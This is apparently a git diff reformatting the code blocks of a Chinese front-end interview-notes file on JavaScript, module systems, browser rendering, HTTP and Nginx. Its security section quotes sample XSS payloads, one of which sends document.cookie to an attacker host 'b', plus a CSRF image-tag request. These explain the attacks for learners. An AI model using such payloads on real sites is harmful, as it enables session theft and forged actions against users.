@@ -16,23 +16,25 @@
 
 ## 如何实现一个 new
 
-    function _new(constructor, ...args) {
-        const target = Object.create(null);
-        target.__proto__ = constructor.prototype;
+```js
+function _new(constructor, ...args) {
+    const target = Object.create(null);
+    target.__proto__ = constructor.prototype;
 
-        const result = constructor.apply(target, args);
-        if(result && (typeof result === 'object' || typeof result === 'function'))
-            return result;
-        return target;
-    }
+    const result = constructor.apply(target, args);
+    if(result && (typeof result === 'object' || typeof result === 'function'))
+        return result;
+    return target;
+}
 
-    function F(id) {
-        this.id = id;
-    }
+function F(id) {
+    this.id = id;
+}
 
-    const f = _new(F, 10);
-    =>
-    const f = new F(10);
+const f = _new(F, 10);
+=>
+const f = new F(10);
+```
 
 ## call、apply、bind 的区别与实现
 
@@ -50,29 +52,29 @@ bind 与 call 参数相似
 
 - call 的实现：
 
-````````````
+```js
 Function.prototype._call = function(context, ...args) {
     context.func = this;
     const result = context.func(...args);
     delete context.func;
     return result;
 }
-````````````
+```
 
 - apply 的实现：
 
-````````````
+```js
 Function.prototype._apply = function(context, args) {
     context.func = this;
     const result = args ? context.func(...args) : context.func();
     delete context.func;
     return result;
 }
-````````````
+```
 
 - bind 的实现：
 
-````````````
+```js
 Function.prototype._bind = function(context, ...args) {
     context.func = this;
     return function F(...params) {
@@ -87,7 +89,7 @@ Function.prototype._bind = function(context, ...args) {
         return result;
     }
 }
-````````````
+```
 
 ## 深拷贝与浅拷贝的区别是什么
 
@@ -95,22 +97,26 @@ Function.prototype._bind = function(context, ...args) {
 
 浅拷贝是将对象每个属性进行依次拷贝，当对象属性值是引用类型时，拷贝其引用地址不重新生成新引用地址。Object.assign、扩展运算符 ...，Array.prototype.slice、Array.prototype.concat 都是浅拷贝：
 
-    const o1 = {
-        id: 1,
-    }
-    const o2 = {
-        list: [1, 2, 3],
-    }
-    Object.assign(o1, o2); // 合并到 o1 上
-    console.log(o1.list === o2.list); // true，浅拷贝 list 属性值
+```js
+const o1 = {
+    id: 1,
+}
+const o2 = {
+    list: [1, 2, 3],
+}
+Object.assign(o1, o2); // 合并到 o1 上
+console.log(o1.list === o2.list); // true，浅拷贝 list 属性值
+```
 
 深拷贝对原对象是递归拷贝的，生成的对象与原对象属性值互不影响，如 JSON.parse(JSON.stringify(obj)) 的配合结果就是深拷贝：
 
-    const o1 = {
-        list: [1, 2, 3],
-    }
-    const o2 = JSON.parse(JSON.stringify(o1));
-    console.log(o1.list === o2.list); // false
+```js
+const o1 = {
+    list: [1, 2, 3],
+}
+const o2 = JSON.parse(JSON.stringify(o1));
+console.log(o1.list === o2.list); // false
+```
 
 ## 如何实现一个深拷贝
 
@@ -118,17 +124,19 @@ Function.prototype._bind = function(context, ...args) {
 
 最简单实现深拷贝的方法，就是使用 JSON.parse(JSON.stringify(obj))：
 
-    const o1 = {
-        list: [1, 2, 3],
-    }
-    const o2 = JSON.parse(JSON.stringify(o1));
-    console.log(o1.list === o2.list); // false
+```js
+const o1 = {
+    list: [1, 2, 3],
+}
+const o2 = JSON.parse(JSON.stringify(o1));
+console.log(o1.list === o2.list); // false
+```
 
 然而这个方法的局限性非常大，如拷贝其他引用类型、函数、循环引用等都存在缺陷
 
 - 基础实现
 
-`````````````
+```js
 function clone(target) {
     if (typeof target === 'object') {
         let cloneTarget = {};
@@ -140,7 +148,7 @@ function clone(target) {
         return target;
     }
 }
-`````````````
+```
 
 更深层的写法可以参考：[如何写出一个惊艳面试官的深拷贝](https://juejin.im/post/5d6aa4f96fb9a06b112ad5b1)
 
@@ -150,9 +158,11 @@ function clone(target) {
 
 函数柯里化是把接收多个参数的函数，转为为一系列使用一个参数的函数的技术：
 
-    fn(1, 2, 3, 4);
-    =>
-    fn(1)(2)(3)(4);
+```js
+fn(1, 2, 3, 4);
+=>
+fn(1)(2)(3)(4);
+```
 
 作用:
 
@@ -162,14 +172,16 @@ function clone(target) {
 
 实现：
 
-    function curry(fn, ...args) {
-        return fn.length > args.length ? (...params) => curry(fn, ...args, ...params) : fn(...args);
-    }
-    function sum(a, b, c) {
-        return a + b + c;
-    }
-    const _sum = curry(sum);
-    console.log(_sum(1)(2)(3)); // 6
+```js
+function curry(fn, ...args) {
+    return fn.length > args.length ? (...params) => curry(fn, ...args, ...params) : fn(...args);
+}
+function sum(a, b, c) {
+    return a + b + c;
+}
+const _sum = curry(sum);
+console.log(_sum(1)(2)(3)); // 6
+```
 
 ## 什么是反柯里化，如何实现
 
@@ -181,34 +193,40 @@ function clone(target) {
 
 为了扩展到更多的对象，如 arguments 也能使用，可以这样做：
 
-    Array.prototype.push.call(arguments, 4);
+```js
+Array.prototype.push.call(arguments, 4);
+```
 
 反柯里化就是利用这种操作来实现的：
 
-    Function.prototype.uncurrying = function () { 
-        const self = this; 
-        return function() { 
-            const obj = Array.prototype.shift.call(arguments); 
-            return self.apply(obj, arguments); 
-        }; 
-    };
+```js
+Function.prototype.uncurrying = function () { 
+    const self = this; 
+    return function() { 
+        const obj = Array.prototype.shift.call(arguments); 
+        return self.apply(obj, arguments); 
+    }; 
+};
+```
 
 使用：
 
-    const push = Array.prototype.push.uncurrying();
+```js
+const push = Array.prototype.push.uncurrying();
 
-    (function(){ 
-        push(arguments, 4); 
-        console.log(arguments); // 输出：[1, 2, 3, 4] 
-    })(1, 2, 3);
+(function(){ 
+    push(arguments, 4); 
+    console.log(arguments); // 输出：[1, 2, 3, 4] 
+})(1, 2, 3);
 
-    const obj  = {
-        length: 1,
-        0: 10,
-    }
+const obj  = {
+    length: 1,
+    0: 10,
+}
 
-    push(obj, 20);
-    console.log(obj); // {0: 10, 1: 20, length: 2}
+push(obj, 20);
+console.log(obj); // {0: 10, 1: 20, length: 2}
+```
 
 如上，经过 uncurrying，数组的 push 变成了一个通用的 push，不仅仅局限于 array 对象，并且调用 push 函数的方式也显得更加简洁和意图明了
 
@@ -220,7 +238,7 @@ function clone(target) {
 
 - 防抖函数：
 
-`````````````
+```js
 function debounce(fn, delay) {
     let timer = null;
     return function(...args) {
@@ -231,11 +249,11 @@ function debounce(fn, delay) {
         }, delay);
     }
 }
-`````````````
+```
 
 - 节流函数：
 
-`````````````
+```js
 function throttle(fn, delay) {
     let prevTime = Date.now();
     return function(...args) {
@@ -245,23 +263,25 @@ function throttle(fn, delay) {
         prevTime = Date.now();
     }
 }
-`````````````
+```
 
 ## 什么是闭包
 
 内部函数调用外部函数的变量，并持续引用，就是闭包：
 
-    function a() {
-        let i = 0;
-        return function() {
-            console.log(i);
-            i++;
-        }
+```js
+function a() {
+    let i = 0;
+    return function() {
+        console.log(i);
+        i++;
     }
+}
 
-    const _a = a();
-    _a(); // 0
-    _a(); // 1
+const _a = a();
+_a(); // 0
+_a(); // 1
+```
 
 作用：
 
@@ -269,7 +289,7 @@ function throttle(fn, delay) {
 
 - 私有化变量
 
-```````````
+```js
 function create() {
     let x = 1;
     return {
@@ -281,19 +301,19 @@ function create() {
 
 const obj = create();
 obj.getX(); // 私有化 x，只能调用 getX 访问
-```````````
+```
 
 - 模块化独立作用域，如 webpack 模块化编译后都是一个个闭包
 
-```````````
+```js
 const moduleA = (function() {
     ... 
 }());
-```````````
+```
 
 - 构建单例
 
-````````````
+```js
 const createSingle = (function() {
     let single = null;
     return function(id) {
@@ -306,25 +326,29 @@ const createSingle = (function() {
 const o1 = createSingle(1);
 const o2 = createSingle(1);
 console.log(o1 === o2); // true
-````````````
+```
 
 ## 如何实现 flattenDeep 将嵌套数组扁平化
 
-    [1, [2, 3, [4, 5, 6], 7], 8]
-    
-    =>
+```js
+[1, [2, 3, [4, 5, 6], 7], 8]
 
-    [1, 2, 3, 4, 5, 6, 7, 8]
+=>
+
+[1, 2, 3, 4, 5, 6, 7, 8]
+```
 
 实现：
 
-    function flattenDeep(arr) {
-        return arr.reduce((prevArr, cur) => {
-            return prevArr.concat(Array.isArray(cur) ? flattenDeep(cur) : cur);
-        }, []);
-    }
-    const arr = [1, [2, 3, [4, 5, 6], 7], 8];
-    console.log(flattenDeep(arr));
+```js
+function flattenDeep(arr) {
+    return arr.reduce((prevArr, cur) => {
+        return prevArr.concat(Array.isArray(cur) ? flattenDeep(cur) : cur);
+    }, []);
+}
+const arr = [1, [2, 3, [4, 5, 6], 7], 8];
+console.log(flattenDeep(arr));
+```
 
 ## 什么是原型链
 
@@ -336,19 +360,21 @@ console.log(o1 === o2); // true
 
 ## ES5 如何实现继承
 
-    function A(id) {
-        this.id = id;
-    }
-    A.prototype.name = 'k'
+```js
+function A(id) {
+    this.id = id;
+}
+A.prototype.name = 'k'
 
-    function B(id) {
-        A.call(this, id);
-    }
+function B(id) {
+    A.call(this, id);
+}
 
-    function F() {}
-    F.prototype = A.prototype;
-    B.prototype = new F();
-    B.prototype.code = '902';
+function F() {}
+F.prototype = A.prototype;
+B.prototype = new F();
+B.prototype.code = '902';
+```
 
 ## 浏览器有哪些线程
 
@@ -510,7 +536,7 @@ js 的执行时间可能在 DOMContentLoaded 之前也可能在之后
 
 - 回流：当 render tree 中部分或全部元素的尺寸、结构、或某些属性发生变化时，浏览器重新渲染部分或全部文档的过程。如调用：
 
-```````````
+```js
 clientWidth、clientHeight、clientTop、clientLeft
 
 offsetWidth、offsetHeight、offsetTop、offsetLeft
@@ -524,7 +550,7 @@ getComputedStyle()
 getBoundingClientRect()
 
 scrollTo()
-```````````
+```
 
 **对比：**
 
@@ -539,17 +565,19 @@ scrollTo()
 
 当访问以下属性，浏览器会立即清空队列，因为浏览器担心队列里可能会有影响这些属性或方法返回值的操作，为了确保你拿到最精确的值，浏览器会强制清空队列：
 
-    clientWidth、clientHeight、clientTop、clientLef
-    
-    toffsetWidth、offsetHeight、offsetTop、offsetLefts
-    
-    crollWidth、scrollHeight、scrollTop、scrollLeft
-    
-    width、height
-    
-    getComputedStyle()
-    
-    getBoundingClientRect()
+```js
+clientWidth、clientHeight、clientTop、clientLef
+
+toffsetWidth、offsetHeight、offsetTop、offsetLefts
+
+crollWidth、scrollHeight、scrollTop、scrollLeft
+
+width、height
+
+getComputedStyle()
+
+getBoundingClientRect()
+```
 
 **如何避免：**
 
@@ -587,19 +615,21 @@ scrollTo()
 
 Node.js是 CommonJS 主要实践者，一个文件就是一个模块，使用 module.exports（或直接 exports） 定义当前模块对外输出接口，required 加载模块：
 
-    // main.js
-    var num = 0;
-    function add(a, b) {
-        return a + b;
-    }
-    module.exports = {
-        add: add,
-        num: num
-    }
+```js
+// main.js
+var num = 0;
+function add(a, b) {
+    return a + b;
+}
+module.exports = {
+    add: add,
+    num: num
+}
 
-    // app.js
-    var math = require('./math');
-    math.add(2, 5);
+// app.js
+var math = require('./math');
+math.add(2, 5);
+```
 
 CommonJS 用**同步**的方式加载模块，只有加载完成才能执行后面的操作
 
@@ -615,60 +645,66 @@ AMD 采用异步加载模块，模块的加载不影响后面语句运行
 
 现在主要遵循 AMD 规范的是 RequireJS：使用 require.config() 指定引用路径等，define() 定义模块，require() 加载模块：
 
-    // 页面中引入 require.js、main.js
-    <script src="js/require.js" data-main="js/main"></script>
+```js
+// 页面中引入 require.js、main.js
+<script src="js/require.js" data-main="js/main"></script>
 
-    // main.js 主模块
-    require.config({
-        baseUrl: "js/lib",
-        paths: {
-            "jquery": "jquery.min",
-            "underscore": "underscore.min",
-        }
-    });
+// main.js 主模块
+require.config({
+    baseUrl: "js/lib",
+    paths: {
+        "jquery": "jquery.min",
+        "underscore": "underscore.min",
+    }
+});
 
-    // 执行基本操作
-    require(["jquery","underscore"],function($,_){
-        ...
-    }); 
+// 执行基本操作
+require(["jquery","underscore"],function($,_){
+    ...
+}); 
+```
 
 定义的模块也依赖其他模块时：
 
-    // 定义 main.js 模块
-    define(function() {
-        var num = 0;
-        function add(a, b) {
-            return a + b;
-        }
-        return {
-            add: add,
-            num: num,
-        }
-    })
+```js
+// 定义 main.js 模块
+define(function() {
+    var num = 0;
+    function add(a, b) {
+        return a + b;
+    }
+    return {
+        add: add,
+        num: num,
+    }
+})
 
-    // 定义 b.js 模块，依赖 math 模块
-    define(['main.js'], function(math) {
+// 定义 b.js 模块，依赖 math 模块
+define(['main.js'], function(math) {
+    ...
+    return {
         ...
-        return {
-            ...
-        }
-    })
+    }
+})
 
-    // 引用
-    require(['jquery', 'math'], function($, math) {
-        math.add(1, 2);
-        ...
-    })
+// 引用
+require(['jquery', 'math'], function($, math) {
+    math.add(1, 2);
+    ...
+})
+```
 
 
 AMD 推崇的是依赖前置，提前执行，如 require.js 在申明依赖时会直接加载并执行模块代码：
 
-    define(["jquery","math"],function($, math){
-        if(false) {
-            // 执行不到这里
-            $('#app').animate();
-        }
-    }); 
+```js
+define(["jquery","math"],function($, math){
+    if(false) {
+        // 执行不到这里
+        $('#app').animate();
+    }
+}); 
+```
 
 上例中，即使根本用不到 jquery，但是我们在 [] 里把它引入了，也会加载并执行它，这样如果引入了多余的模块没有使用，是浪费性能的
 
@@ -676,41 +712,45 @@ AMD 推崇的是依赖前置，提前执行，如 require.js 在申明依赖时�
 
 AMD 推崇的是依赖前置，提前执行，而 CMD 推崇的是依赖就近，延迟执行：
 
-    // AMD 写法
-    define(["jquery","math"],function($, math){
-        math.add(1, 2);
-        if(false) {
-            $('#app').animate();
-        }
-    }); 
+```js
+// AMD 写法
+define(["jquery","math"],function($, math){
+    math.add(1, 2);
+    if(false) {
+        $('#app').animate();
+    }
+}); 
 
-    // CMD 写法
-    define(function(require, exports, module) {
-        var math = require('./math');
-        math.add(1, 2);
-        if(false) {
-            var $ = require('./jquery');
-            $('#app').animate();
-        }
-    })
+// CMD 写法
+define(function(require, exports, module) {
+    var math = require('./math');
+    math.add(1, 2);
+    if(false) {
+        var $ = require('./jquery');
+        $('#app').animate();
+    }
+})
+```
 
 这样的做法可以看到，之前 AMD 中加载多余模块的问题就可以解决
 
 CMD 规范其实是在 sea.js 推广过程中产生的：
 
-    // sea.js
-    // 定义 math.js 模块
-    define(function(require, exports, module) {
-        var add = function(a,b){
-            return a+b;
-        }
-        exports.add = add;
-    })
+```js
+// sea.js
+// 定义 math.js 模块
+define(function(require, exports, module) {
+    var add = function(a,b){
+        return a+b;
+    }
+    exports.add = add;
+})
 
-    // 加载模块
-    seajs.use(['main.js'], function(math) {
-        var sum = math.add(1, 2);
-    })
+// 加载模块
+seajs.use(['main.js'], function(math) {
+    var sum = math.add(1, 2);
+})
+```
 
 - ES 模块系统
 
@@ -718,33 +758,37 @@ CMD 规范其实是在 sea.js 推广过程中产生的：
 
 主要由两个命令构成：import、export：
 
-    // 定义 math.js 模块
-    var num = 0;
-    var add = function(a, b) {
-        return a + b;
-    }
+```js
+// 定义 math.js 模块
+var num = 0;
+var add = function(a, b) {
+    return a + b;
+}
 
-    export {
-        num,
-        add,
-    }
+export {
+    num,
+    add,
+}
 
-    // 引用模块
-    import { num, add } from './math';
-    add(1, 2);
+// 引用模块
+import { num, add } from './math';
+add(1, 2);
+```
 
 也可以使用 export default 命令指定默认导出：
 
-    // main.js
-    var add = function(a, b) {
-        return a + b;
-    }
+```js
+// main.js
+var add = function(a, b) {
+    return a + b;
+}
 
-    export default add;
+export default add;
 
-    // 引用模块
-    import add from './math.js';
-    add(1, 2);
+// 引用模块
+import add from './math.js';
+add(1, 2);
+```
 
 ES 模块不是对象，import 命令会被 JavaScript 引擎静态分析，**在编译时就引入模块代码，而不是在代码运行时**，所以无法实现条件加载
 
@@ -770,17 +814,21 @@ ES 模块不是对象，import 命令会被 JavaScript 引擎静态分析，**�
  
 每个分片发送结构如下：
 
-    {
-        chunk: file 分片
-        hash: filename + '-' + index（如：不可描述的视频-1）
-        filename: 文件名（不可描述的视频）
-    }
+```js
+{
+    chunk: file 分片
+    hash: filename + '-' + index（如：不可描述的视频-1）
+    filename: 文件名（不可描述的视频）
+}
+```
 
  结束后调用接口通知后端合并文件，传递参数：
 
-    {
-        filename: 文件名（不可描述的视频）
-    }
+```js
+{
+    filename: 文件名（不可描述的视频）
+}
+```
 
 
 后端：
@@ -895,48 +943,50 @@ has 值校验文件是否已上传过的校验接口
 
 如下：
 
-    // 这是纯函数，只依赖参数
-    function add(x, y) {
-        return x + y;
-    }
+```js
+// 这是纯函数，只依赖参数
+function add(x, y) {
+    return x + y;
+}
 
-    // 这不是纯函数，依赖了外部变量
-    const x = 10;
-    function add(y) {
-        return x + y;
-    }
+// 这不是纯函数，依赖了外部变量
+const x = 10;
+function add(y) {
+    return x + y;
+}
 
-    // 这不是纯函数，改变了参数数据
-    function mutation(item) {
-        item.sum = 10;
-        return item;
-    }
+// 这不是纯函数，改变了参数数据
+function mutation(item) {
+    item.sum = 10;
+    return item;
+}
+```
 
 纯函数的优点：
 
 - 引用透明性：输入相同的值总返回相同的结果。如果一段代码可以替换成它执行所得结果，且在不改变整个程序行为的前提下替换，那就可以说这段代码是引用透明的
 
-`````````````
-    function add(x, y) {
-        return x + y;
-    }
+```js
+function add(x, y) {
+    return x + y;
+}
 
-    function main() {
-        ...
-        const a = add(1, 4);
-        ...
-    }
+function main() {
+    ...
+    const a = add(1, 4);
+    ...
+}
 
-    以上可以直接替换为：
+以上可以直接替换为：
 
-    function main() {s
-        ...
-        const a = 5;
-        ...
-    }
+function main() {s
+    ...
+    const a = 5;
+    ...
+}
 
-    而不影响整个程序
-`````````````
+而不影响整个程序
+```
 
 - 可复用性：只依赖传入的参数，意味着可以随意将这个函数移植到别的代码。如果我们在别的代码中引用了非纯函数，这个非纯函数可能引用的外部变量，那当外部变量改变时，就会导致非纯函数的结果可能改变，也间接导致引用的代码也受到影响
 
@@ -964,23 +1014,25 @@ has 值校验文件是否已上传过的校验接口
 
 如下实现函数执行前的打印：
 
-    Function.prototype.before = function(fn) {
-        const _this = this;
-        return function() {
-            fn.apply(this, arguments);
-            return _this.apply(this, arguments);
-        }
-    };
+```js
+Function.prototype.before = function(fn) {
+    const _this = this;
+    return function() {
+        fn.apply(this, arguments);
+        return _this.apply(this, arguments);
+    }
+};
 
-    let func = function(){
-        console.log(2);
-    };
+let func = function(){
+    console.log(2);
+};
 
-    func = func.before(function(){
-        console.log(1);
-    });
+func = func.before(function(){
+    console.log(1);
+});
 
-    func(); // 输出 1、2
+func(); // 输出 1、2
+```
 
 - 柯里化
 
@@ -990,68 +1042,76 @@ has 值校验文件是否已上传过的校验接口
 
 实现：
 
-    function curry(fn, ...args) {
-        return fn.length > args.length ? (...params) => curry(fn, ...args, ...params) : fn(...args);
-    }
+```js
+function curry(fn, ...args) {
+    return fn.length > args.length ? (...params) => curry(fn, ...args, ...params) : fn(...args);
+}
+```
 
 作用：
 
 参数复用
 
-    function record(type, msg) {
-        switch (type) {
-            case 'log':
-                console.log(msg);
-                break;
-            case 'warn':
-                console.warn(msg);
-                break;
-        }
+```js
+function record(type, msg) {
+    switch (type) {
+        case 'log':
+            console.log(msg);
+            break;
+        case 'warn':
+            console.warn(msg);
+            break;
     }
+}
 
-    record('log', '1');
-    record('log', '2');
-    record('log', '3');
-    ...
+record('log', '1');
+record('log', '2');
+record('log', '3');
+...
+```
 
 如上当使用 log 打印信息时，每次都要重新传入 'log'
 
 其实可以使用 curry 分离参数，将同一种类型的分离出来，达到参数复用：
 
-    const _curry = curry(record);
+```js
+const _curry = curry(record);
 
-    const log_record = _curry('log'); // 抽离 log 类型
+const log_record = _curry('log'); // 抽离 log 类型
 
-    log_record('1');
-    log_record('2');
-    log_record('3');
+log_record('1');
+log_record('2');
+log_record('3');
+```
 
 - 防抖、节流
 
 防抖和节流函数的封装也需要用到高阶函数返回一个函数的特性：
 
-    // 防抖
-    function debounce(fn, delay) {
-        let timer = null;
-        return function(...args) {
-            const context = this;
-            clearTimeout(timer);
-            timer = setTimeout(() => {
-                fn.call(context, ...args);
-            }, delay);
-        }
+```js
+// 防抖
+function debounce(fn, delay) {
+    let timer = null;
+    return function(...args) {
+        const context = this;
+        clearTimeout(timer);
+        timer = setTimeout(() => {
+            fn.call(context, ...args);
+        }, delay);
     }
+}
 
-    // 节流
-    function throttle(fn, delay) {
-        let prevTime = Date.now();
-        return function(...args) {
-            if(Date.now() - prevTime < delay) return;
-            
-            fn.call(this, ...args);
-            prevTime = Date.now();
-        }
+// 节流
+function throttle(fn, delay) {
+    let prevTime = Date.now();
+    return function(...args) {
+        if(Date.now() - prevTime < delay) return;
+        
+        fn.call(this, ...args);
+        prevTime = Date.now();
     }
+}
+```
 
 - 分时函数
 
@@ -1061,75 +1121,83 @@ has 值校验文件是否已上传过的校验接口
 
 可以对添加操作进行拆分，例如原本一次性添加 1000 个节点，变成每 200ms 添加 10 个节点，这就可以构造一个分时函数来完成：
 
-    const timeChunk = function(arr, fn, count = 1) {
-        const start = function() {
-            for (let i = 0; i < Math.min(count, arr.length); i++) {
-                fn(arr.shift());
-            }
-        };
-        return function () {
-            const timer = setInterval(function() {
-                if (arr.length === 0) { //如果全部的节点都已经被创建好了
-                    return clearInterval(timer)
-                }
-                start();
-            }, 200);
+```js
+const timeChunk = function(arr, fn, count = 1) {
+    const start = function() {
+        for (let i = 0; i < Math.min(count, arr.length); i++) {
+            fn(arr.shift());
         }
+    };
+    return function () {
+        const timer = setInterval(function() {
+            if (arr.length === 0) { //如果全部的节点都已经被创建好了
+                return clearInterval(timer)
+            }
+            start();
+        }, 200);
     }
+}
 
-    const arr = [1, 2, ..., 1000];
-    const _timeChunk = timeChunk(arr, item => {
-        console.log(item);
-    }, 10);
+const arr = [1, 2, ..., 1000];
+const _timeChunk = timeChunk(arr, item => {
+    console.log(item);
+}, 10);
 
-    _timeChunk();
+_timeChunk();
+```
 
 - 惰性加载
 
 因为浏览器之间的差异，我们在做兼容性处理，如绑定事件时，可能是这样处理的：
 
-    const addEvent = function(elem, type, handler) {
-        if (window.addEventListener) {
-            return elem.addEventListener(type, handler, false);
-        }
-        if (window.attachEvent) {
-            return elem.attachEvent('on' + type, handler);
-        }
-    };
+```js
+const addEvent = function(elem, type, handler) {
+    if (window.addEventListener) {
+        return elem.addEventListener(type, handler, false);
+    }
+    if (window.attachEvent) {
+        return elem.attachEvent('on' + type, handler);
+    }
+};
+```
 
 然而这种写法导致每次绑定新的事件，都要不断去重复判断，虽然判断的开销不大，但是也显得多余
 
 可以使用高阶函数做惰性加载：
 
-    const addEvent = (function() {
-        if (window.addEventListener) {
-            return function(elem, type, handler) {
-                elem.addEventListener(type, handler, false);
-            }
+```js
+const addEvent = (function() {
+    if (window.addEventListener) {
+        return function(elem, type, handler) {
+            elem.addEventListener(type, handler, false);
         }
-        if (window.attachEvent) {
-            return function(elem, type, handler) {
-                elem.attachEvent('on' + type, handler);
-            }
+    }
+    if (window.attachEvent) {
+        return function(elem, type, handler) {
+            elem.attachEvent('on' + type, handler);
         }
-    })();
+    }
+})();
+```
 
 然而这样做还是有缺陷的，如果我们至始至终没有使用 addEvent 这个函数，addEvent 初始化执行就是在浪费加载时间
 
 可以做如下处理重写，在第一次加载后就重置函数：
 
-    const addEvent = function(elem, type, handler) {
-        if (window.addEventListener) {
-            addEvent = function(elem, type, handler) {
-                elem.addEventListener(type, handler, false);
-            }
-        } else if (window.attachEvent) {
-            addEvent = function(elem, type, handler) {
-                elem.attachEvent('on' + type, handler);
-            }
+```js
+const addEvent = function(elem, type, handler) {
+    if (window.addEventListener) {
+        addEvent = function(elem, type, handler) {
+            elem.addEventListener(type, handler, false);
         }
-        addEvent(elem, type, handler);
-    };
+    } else if (window.attachEvent) {
+        addEvent = function(elem, type, handler) {
+            elem.attachEvent('on' + type, handler);
+        }
+    }
+    addEvent(elem, type, handler);
+};
+```
 
 ## localStorage、sessionStorage、cookie 区别
 
@@ -1159,7 +1227,9 @@ XSS：Cross Site Script，跨站脚本攻击
 
 假如如果有人在论坛发了一个这样的链接：
 
-    http://a.jsp?name=<script>document.write("<img src='http://b?key=" + escape(document.cookie) + "'>")</script>
+```html
+http://a.jsp?name=<script>document.write("<img src='http://b?key=" + escape(document.cookie) + "'>")</script>
+```
 
 当我们去点击这个链接时，我们在 a 网站的 cookie 就被作为参数发送到了黑客的 b 网站，只要黑客在 b 网站里接收参数 key，就可以拿到你的 cookie，做到 XSS 攻击
 
@@ -1173,12 +1243,14 @@ XSS：Cross Site Script，跨站脚本攻击
 
 这时黑客在 textarea 中输入如下信息：
 
-    <div>
-        ...
-    </div>
-    <script>
-        alert(document.cookie);
-    </script>
+```html
+<div>
+    ...
+</div>
+<script>
+    alert(document.cookie);
+</script>
+```
 
 然后发表文章，文章 URL 为 http://a.im/article/10001
 
@@ -1190,14 +1262,18 @@ XSS：Cross Site Script，跨站脚本攻击
 
 例如页面 http://a.im?url=XXX 有如下结构：
 
-    const s = location.search.substring(1);
-    const url = getParam(s, 'url'); // 从 ?name=XXX 获取值
+```js
+const s = location.search.substring(1);
+const url = getParam(s, 'url'); // 从 ?name=XXX 获取值
 
-    document.getElementById("url").innerHTML = "<a href='" + url + "'>link</a>";
+document.getElementById("url").innerHTML = "<a href='" + url + "'>link</a>";
+```
 
 如果这时有个链接是：
 
-    http://a.im?url=javascript:alert(document.cookie)
+```js
+http://a.im?url=javascript:alert(document.cookie)
+```
 
 就会执行这个恶意脚本，被获取到 cookie 信息
 
@@ -1231,17 +1307,23 @@ CSRF：Cross Site Request Forgery，跨站请求伪造
 
 用户**登录**后，可以删除自己的文章，删除时前端会调用接口：
 
-    http://www.c.im/article/delete/:id
+```js
+http://www.c.im/article/delete/:id
+```
 
 而用户在登录时，会设置包含自己身份信息的 cookie，伴随接口调用一起发送给后端
 
 当**用户尚未关闭 c 网站时（或 c 网站 cookie 还未过期）**，他打开了恶意网站 b：
 
-    http:// www.b.im
+```js
+http:// www.b.im
+```
 
 而 b 网站有如下结构：
 
-    <img src="http://www.c.im/article/delete/10">
+```html
+<img src="http://www.c.im/article/delete/10">
+```
 
 这样，当用户打开 b 攻击网站时，就会发起一条 c 网站的删除请求（img 不会有跨域问题），而因为 c 网站的 cookie 依旧在有效期，会跟着这条请求一并被发送，导致用户 id 为 10 的文章就被删除了
 
@@ -1364,43 +1446,47 @@ PUT 是幂等的，连续调用一次或多次效果相同，POST 不是幂等�
 
 PUT 的 URI 通常指向具体单一资源，POST 可以指向资源集合
 
-    如我们创建一篇文章时往往 POST：https://www.xxx.com/articles
+```js
+如我们创建一篇文章时往往 POST：https://www.xxx.com/articles
 
-    语义是在 articles 资源集合下创建一篇新文章，如果多次提交这个请求，会创建多个文章，不幂等
+语义是在 articles 资源集合下创建一篇新文章，如果多次提交这个请求，会创建多个文章，不幂等
 
-    而 PUT：https://www.xxx.com/articles/4863 语义是更新对应文章下的资源，是幂等的，如把 karmiy 改为 karloy，发多少次都是改为 karloy
+而 PUT：https://www.xxx.com/articles/4863 语义是更新对应文章下的资源，是幂等的，如把 karmiy 改为 karloy，发多少次都是改为 karloy
+```
 
 ## PUT 和 PATCH 都是给服务器发送修改资源，有什么区别
 
 PATCH 一般对已知资源进行局部更新
 
-    如有个文章地址：https://www.xxx.com/articles/4863
+```js
+如有个文章地址：https://www.xxx.com/articles/4863
 
-    这个文章可以表示为：
+这个文章可以表示为：
 
-        article = {
-            author: 'karmiy',
-            createTime: '2012-01-12',
-            content: 'aaaa',
-            id: 10,
-        }
+    article = {
+        author: 'karmiy',
+        createTime: '2012-01-12',
+        content: 'aaaa',
+        id: 10,
+    }
 
-    当我们修改文章作者，发送 PUT 请求，这时数据应该是如下：
+当我们修改文章作者，发送 PUT 请求，这时数据应该是如下：
 
-        article = {
-            author: 'karloy',
-            createTime: '2012-01-12',
-            content: 'aaaa',
-            id: 10,
-        }
+    article = {
+        author: 'karloy',
+        createTime: '2012-01-12',
+        content: 'aaaa',
+        id: 10,
+    }
 
-    这种直接覆盖资源的修改方式用 PUT
+这种直接覆盖资源的修改方式用 PUT
 
-    但是你觉得每次带这么多无用信息，那么可以使用 PATCH，只需要发送数据：
+但是你觉得每次带这么多无用信息，那么可以使用 PATCH，只需要发送数据：
 
-        {
-            author: 'karloy',
-        }
+    {
+        author: 'karloy',
+    }
+```
 
 ## 什么是正向代理、反向代理
 
@@ -1436,17 +1522,19 @@ Nginx 是一款轻量级的 HTTP 服务器，采用事件驱动的异步非阻�
 
 经常会遇到希望网站让某些特定用户群体访问，不让某个 URI 访问，可以配置：
 
-    location / {
-        deny  192.168.1.100;
-        allow 192.168.1.10/200;
-        allow 10.110.50.16;
-        deny  all;
-    }
+```js
+location / {
+    deny  192.168.1.100;
+    allow 192.168.1.10/200;
+    allow 10.110.50.16;
+    deny  all;
+}
 
-    禁止 192.168.1.100 访问
-    允许 192.168.1.10 - 192.168.1.200 访问（除了 192.168.1.100）
-    允许 10.110.50.16 这个单独 ip 访问
-    剩余未匹配全部禁止访问
+禁止 192.168.1.100 访问
+允许 192.168.1.10 - 192.168.1.200 访问（除了 192.168.1.100）
+允许 10.110.50.16 这个单独 ip 访问
+剩余未匹配全部禁止访问
+```
 
 - 解决跨域：
 
@@ -1458,12 +1546,14 @@ Nginx 是一款轻量级的 HTTP 服务器，采用事件驱动的异步非阻�
 
 同时约定一个 url 规则来表明代理请求身份，Nginx 通过匹配规则，将请求代理回原来的域
 
-    #请求跨域，这里约定代理请求url path是以/apis/开头
-    location ^~/apis/ {
-        # 这里重写了请求，将正则匹配中的第一个()中$1的path，拼接到真正的请求后面，并用break停止后续匹配
-        rewrite ^/apis/(.*)$ /$1 break;
-        proxy_pass https://www.kaola.com/;
-    }
+```js
+#请求跨域，这里约定代理请求url path是以/apis/开头
+location ^~/apis/ {
+    # 这里重写了请求，将正则匹配中的第一个()中$1的path，拼接到真正的请求后面，并用break停止后续匹配
+    rewrite ^/apis/(.*)$ /$1 break;
+    proxy_pass https://www.kaola.com/;
+}
+```
 
 接着将请求从 http://www.kaola.com/getPCBannerList.html 变为 http://mysite-base.com/apis/getPCBannerList.html，就可以正常请求了
 
